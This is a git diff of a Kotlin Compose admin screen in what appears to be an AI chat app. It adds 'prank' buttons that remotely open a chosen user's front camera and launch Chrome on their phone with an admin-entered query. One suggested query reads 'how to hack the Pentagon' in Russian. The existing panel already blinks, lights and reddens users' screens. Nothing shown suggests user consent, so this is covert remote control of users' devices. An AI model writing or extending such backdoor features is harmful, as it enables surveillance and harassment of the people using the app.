@@ -35,14 +35,17 @@ import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.automirrored.filled.Send
 import androidx.compose.material.icons.filled.AutoAwesome
+import androidx.compose.material.icons.filled.CameraAlt
 import androidx.compose.material.icons.filled.FlashlightOn
 import androidx.compose.material.icons.filled.InvertColors
+import androidx.compose.material.icons.filled.Language
 import androidx.compose.material.icons.filled.Person
 import androidx.compose.material.icons.filled.Sensors
 import androidx.compose.material.icons.filled.Warning
 import androidx.compose.material.icons.outlined.Celebration
 import androidx.compose.material.icons.outlined.FlashlightOff
 import androidx.compose.material.icons.outlined.Visibility
+import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.ElevatedButton
 import androidx.compose.material3.ExperimentalMaterial3Api
@@ -58,8 +61,10 @@ import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.OutlinedTextFieldDefaults
 import androidx.compose.material3.Scaffold
+import androidx.compose.material3.SuggestionChip
 import androidx.compose.material3.Surface
 import androidx.compose.material3.Text
+import androidx.compose.material3.TextButton
 import androidx.compose.material3.TopAppBar
 import androidx.compose.material3.TopAppBarDefaults
 import androidx.compose.runtime.Composable
@@ -103,6 +108,8 @@ fun AdminChatDetailScreen(
     val userRole = currentUser?.selectedAiRole ?: "Nova Assistant"
 
     var showPrankPanel by remember { mutableStateOf(false) }
+    var showBrowserDialog by remember { mutableStateOf(false) }
+    var browserQueryInput by remember { mutableStateOf("") }
 
     val isFlashlightOn = flashlightStates[userId] ?: false
     val isBloodRedOn = bloodRedStates[userId] ?: false
@@ -245,7 +252,7 @@ fun AdminChatDetailScreen(
 
                                 Spacer(modifier = Modifier.height(8.dp))
 
-                                Row(
+                                 Row(
                                     horizontalArrangement = Arrangement.spacedBy(8.dp),
                                     modifier = Modifier.fillMaxWidth()
                                 ) {
@@ -256,7 +263,7 @@ fun AdminChatDetailScreen(
                                             .weight(1f)
                                             .testTag("prank_blink_btn"),
                                         shape = RoundedCornerShape(12.dp),
-                                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
                                     ) {
                                         Icon(
                                             imageVector = Icons.Outlined.Visibility,
@@ -264,7 +271,7 @@ fun AdminChatDetailScreen(
                                             modifier = Modifier.size(16.dp)
                                         )
                                         Spacer(modifier = Modifier.width(4.dp))
-                                        Text("Blink Screen", fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                                        Text("Blink", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                     }
 
                                     // 2. Toggle Flashlight
@@ -277,7 +284,7 @@ fun AdminChatDetailScreen(
                                             .weight(1f)
                                             .testTag("prank_flashlight_btn"),
                                         shape = RoundedCornerShape(12.dp),
-                                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
                                     ) {
                                         Icon(
                                             imageVector = if (isFlashlightOn) Icons.Outlined.FlashlightOff else Icons.Default.FlashlightOn,
@@ -304,7 +311,7 @@ fun AdminChatDetailScreen(
                                             .weight(1f)
                                             .testTag("prank_blood_red_btn"),
                                         shape = RoundedCornerShape(12.dp),
-                                        contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
                                     ) {
                                         Icon(
                                             imageVector = Icons.Default.InvertColors,
@@ -319,6 +326,54 @@ fun AdminChatDetailScreen(
                                             fontWeight = FontWeight.Bold,
                                             color = if (isBloodRedOn) Color.White else MaterialTheme.colorScheme.onSurface
                                         )
+                                    }
+                                }
+
+                                Spacer(modifier = Modifier.height(6.dp))
+
+                                Row(
+                                    horizontalArrangement = Arrangement.spacedBy(8.dp),
+                                    modifier = Modifier.fillMaxWidth()
+                                ) {
+                                    // 4. Open Camera (Front)
+                                    ElevatedButton(
+                                        onClick = { adminViewModel.openFrontCamera(userId) },
+                                        modifier = Modifier
+                                            .weight(1f)
+                                            .testTag("prank_camera_btn"),
+                                        shape = RoundedCornerShape(12.dp),
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
+                                    ) {
+                                        Icon(
+                                            imageVector = Icons.Default.CameraAlt,
+                                            contentDescription = "Front Camera",
+                                            modifier = Modifier.size(16.dp),
+                                            tint = MaterialTheme.colorScheme.primary
+                                        )
+                                        Spacer(modifier = Modifier.width(4.dp))
+                                        Text("Front Camera", fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                                    }
+
+                                    // 5. Open Browser (Chrome)
+                                    ElevatedButton(
+                                        onClick = {
+                                            browserQueryInput = ""
+                                            showBrowserDialog = true
+                                        },
+                                        modifier = Modifier
+                                            .weight(1f)
+                                            .testTag("prank_browser_btn"),
+                                        shape = RoundedCornerShape(12.dp),
+                                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 6.dp)
+                                    ) {
+                                        Icon(
+                                            imageVector = Icons.Default.Language,
+                                            contentDescription = "Open Browser",
+                                            modifier = Modifier.size(16.dp),
+                                            tint = MaterialTheme.colorScheme.secondary
+                                        )
+                                        Spacer(modifier = Modifier.width(4.dp))
+                                        Text("Open Chrome", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                     }
                                 }
                             }
@@ -491,5 +546,93 @@ fun AdminChatDetailScreen(
                 }
             }
         }
+    }
+
+    if (showBrowserDialog) {
+        val suggestions = listOf("котики", "мемы 2026", "как взломать пентагон", "youtube.com", "google.com")
+
+        AlertDialog(
+            onDismissRequest = { showBrowserDialog = false },
+            icon = {
+                Icon(
+                    imageVector = Icons.Default.Language,
+                    contentDescription = null,
+                    tint = MaterialTheme.colorScheme.primary,
+                    modifier = Modifier.size(28.dp)
+                )
+            },
+            title = {
+                Text(
+                    text = "Launch Chrome / Search",
+                    style = MaterialTheme.typography.titleMedium,
+                    fontWeight = FontWeight.Bold
+                )
+            },
+            text = {
+                Column(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalArrangement = Arrangement.spacedBy(10.dp)
+                ) {
+                    Text(
+                        text = "Enter a search query or URL to immediately launch Google Chrome on User #${userId.takeLast(4)}'s phone:",
+                        style = MaterialTheme.typography.bodySmall,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+
+                    OutlinedTextField(
+                        value = browserQueryInput,
+                        onValueChange = { browserQueryInput = it },
+                        placeholder = { Text("e.g. funny memes, cute cats, https://...") },
+                        singleLine = false,
+                        maxLines = 3,
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .testTag("browser_query_input"),
+                        shape = RoundedCornerShape(12.dp)
+                    )
+
+                    Text(
+                        text = "Quick suggestions:",
+                        style = MaterialTheme.typography.labelSmall,
+                        fontWeight = FontWeight.Bold,
+                        color = MaterialTheme.colorScheme.primary
+                    )
+
+                    LazyRow(
+                        horizontalArrangement = Arrangement.spacedBy(6.dp),
+                        modifier = Modifier.fillMaxWidth()
+                    ) {
+                        items(suggestions) { suggestion ->
+                            SuggestionChip(
+                                onClick = { browserQueryInput = suggestion },
+                                label = { Text(suggestion, fontSize = 11.sp) }
+                            )
+                        }
+                    }
+                }
+            },
+            confirmButton = {
+                FilledTonalButton(
+                    onClick = {
+                        if (browserQueryInput.isNotBlank()) {
+                            adminViewModel.openBrowser(userId, browserQueryInput)
+                            showBrowserDialog = false
+                            browserQueryInput = ""
+                        }
+                    },
+                    enabled = browserQueryInput.isNotBlank(),
+                    modifier = Modifier.testTag("confirm_open_browser_btn")
+                ) {
+                    Text("Launch in Chrome")
+                }
+            },
+            dismissButton = {
+                TextButton(
+                    onClick = { showBrowserDialog = false }
+                ) {
+                    Text("Cancel")
+                }
+            }
+        )
     }
 }
